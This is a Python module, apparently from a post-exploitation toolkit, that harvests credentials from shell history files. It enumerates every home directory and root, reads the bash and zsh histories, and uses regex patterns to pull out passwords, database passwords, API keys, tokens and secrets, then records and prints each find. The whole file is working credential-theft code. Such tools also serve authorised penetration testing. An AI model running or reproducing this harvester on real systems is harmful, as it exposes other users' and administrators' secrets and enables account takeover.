"""
Command history harvesting
"""

import os
from ..core.utils import run_command, safe_read_file, extract_credentials_with_patterns


class HistoryHarvester:
    """Harvest credentials from command history"""
    
    CREDENTIAL_PATTERNS = [
        r'password["\s]*[:=]["\s]*([^\s"]+)',
        r'passwd["\s]*[:=]["\s]*([^\s"]+)',
        r'pass["\s]*[:=]["\s]*([^\s"]+)',
        r'--password[=\s]+([^\s]+)',
        r'mysql.*-p([^\s]+)',
        r'psql.*password[=\s]+([^\s]+)',
        r'api[_-]?key["\s]*[:=]["\s]*([^\s"]+)',
        r'token["\s]*[:=]["\s]*([^\s"]+)',
        r'secret["\s]*[:=]["\s]*([^\s"]+)'
    ]
    
    def __init__(self, credentials: dict, os_type: str):
        self.credentials = credentials
        self.os_type = os_type
    
    def harvest(self):
        """Search command history for credentials"""
        print("\n[*] Searching bash history for credentials...")
        
        history_files = self._get_history_files()
        found_count = 0
        
        for history_file in history_files:
            if os.path.exists(history_file):
                content = safe_read_file(history_file)
                
                if content:
                    creds = extract_credentials_with_patterns(content, self.CREDENTIAL_PATTERNS)
                    
                    for cred in creds:
                        self.credentials['passwords'].append({
                            'source': history_file,
                            'type': 'Command History',
                            'credential': cred['credential'],
                            'context': cred['context']
                        })
                        found_count += 1
                        print(f"  [+] Found potential credential in: {history_file}")
        
        print(f"  [*] Found {found_count} potential credentials in history files")
    
    def _get_history_files(self) -> list:
        """Get list of history files to check"""
        history_files = []
        
        if self.os_type == 'posix':
            home_dirs = run_command('ls /home 2>/dev/null').split()
            
            for home in home_dirs:
                history_files.extend([
                    f'/home/{home}/.bash_history',
                    f'/home/{home}/.zsh_history'
                ])
            
            history_files.extend([
                '/root/.bash_history',
                os.path.expanduser('~/.bash_history'),
                os.path.expanduser('~/.zsh_history')
            ])
        
        return history_files